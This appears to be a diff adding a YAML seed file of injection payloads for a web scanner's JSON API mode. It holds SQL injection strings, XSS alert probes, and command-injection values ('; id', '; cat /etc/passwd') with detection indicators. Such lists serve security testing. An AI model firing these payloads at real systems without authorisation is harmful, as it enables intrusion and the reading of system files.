@@ -1,0 +1,31 @@
+# JSON API 场景 payload（配合 --post --data 使用，注入 JSON body 字段值）
+seeds:
+  sqli:
+    error:
+      - raw: "1' AND 1=CONVERT(int,(SELECT @@VERSION))-- "
+        ctx: ["numeric"]
+      - raw: "{\\"id\\": \\"1' OR 1=1-- \\"}"
+        type: "json_direct"
+        ctx: ["json"]
+    boolean_true:
+      - raw: "1' AND 1=1-- "
+        ctx: ["numeric"]
+    boolean_false:
+      - raw: "1' AND 1=2-- "
+        ctx: ["numeric"]
+  xss:
+    json:
+      - raw: "\\"-alert(1)-\\""
+        ctx: ["json"]
+      - raw: "<script>alert(1)</script>"
+        ctx: ["json"]
+      - raw: "';alert(1);//"
+        ctx: ["json"]
+  cmdi:
+    output:
+      - raw: "; id"
+        indicator: "uid="
+        ctx: ["all"]
+      - raw: "; cat /etc/passwd"
+        indicator: "root:"
+        ctx: ["all"]
